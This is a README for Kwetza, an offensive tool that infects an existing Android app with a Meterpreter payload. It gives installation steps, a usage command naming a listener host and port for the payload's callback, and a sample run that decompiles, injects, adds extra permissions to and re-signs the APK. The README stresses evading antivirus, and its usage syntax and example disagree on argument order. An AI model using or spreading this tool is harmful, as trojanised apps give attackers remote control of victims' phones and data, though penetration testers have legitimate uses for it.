# Introduction
By Chris Le Roy (@brompwnie) chris@sensepost.com

Kwetza is a tool that allows you to infect an existing Android application with a Meterpreter payload.

# What does it do?

Kwetza infects an existing Android application with either custom or default payload templates to avoid detection by antivirus. Kwetza allows you to infect Android applications using the target application's default permissions or inject additional permissions to gain additional functionality.

# Where can I get the blogpost?
The manual steps automated by Kwetza can be found here: https://sensepost.com/blog/2016/kwetza-infecting-android-applications/

# Getting the code

Firstly get the code:
```
git clone https://github.com/sensepost/kwetza.git
```

Kwetza is written in Python and requires BeautifulSoup which can be installed using Pip:
```
pip install beautifulsoup4
```
Kwetza requires Apktool to be install and accessible via your PATH. This can be setup using the install instructions located here: https://ibotpeaches.github.io/Apktool/install

# Usage

python kwetza.py nameOfTheApkToInfect.apk https/tcp LHOST LPORT yes/no

* nameOfTheApkToInfect.apk = name of the APK you wish to infect.
* https/tcp = select either a HTTPS or TCP connection
* LHOST = IP of your listener.
* LPORT = Port of your listener.
* yes = include "yes" to inject additional evil perms into the app, "no" to utilize the default permissions of the app.

```
python kwetza.py hackme.apk 10.42.0.118 https 4444 yes
[+] MMMMMM KWETZA
[*] DECOMPILING TARGET APK
[+] ENDPOINT IP: 10.42.0.118
[+] ENDPOINT PORT: 4444
[+] APKTOOL DECOMPILED SUCCESS
[*] BYTING COMMS...
[*] ANALYZING ANDROID MANIFEST...
[+] TARGET ACTIVITY: com.foo.moo.gui.MainActivity
[*] INJECTION INTO APK
[+] CHECKING IF ADDITIONAL PERMS TO BE ADDED
[*] INJECTION OF CRAZY PERMS TO BE DONE!
[+] TIME TO BUILD INFECTED APK
[*] EXECUTING APKTOOL BUILD COMMAND
[+] BUILD RESULT
############################################
I: Using APktool 2.2.0
I: Checking whether source shas changed...
I: Smaling smali folder into classes.dex
I: Checking whether resources has changed...
I: Building resources...
I: Copying libs ...(/lib)
I: Building apk file...
I: Copying unknown files/dir...
###########################################
[*] EXECUTING JARSIGNER COMMAND...
Enter Passphrase for keystore: password
[+] JARSIGNER RESULT
###########################################
jar signed.

###########################################

[+] L00t located at hackme/dist/hackme.apk
```


# Information

Kwetza has been developed to work with Python 2.

Kwetza by default will use the template and keystore located in the folder "payload" to inject and sign the infected apk.

If you would like to sign the infected application with your own certificate, generate a new keystore and place it in the "payload" folder and rename to the existing keystore or change the reference in the kwetza.py.

The same can be done for payload templates.

The password for the default keystore is, well, "password".

# License

Kwetza is licensed under a Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License (http://creativecommons.org/licenses/by-nc-sa/4.0).

Permissions beyond the scope of this license may be available at http://sensepost.com/contact
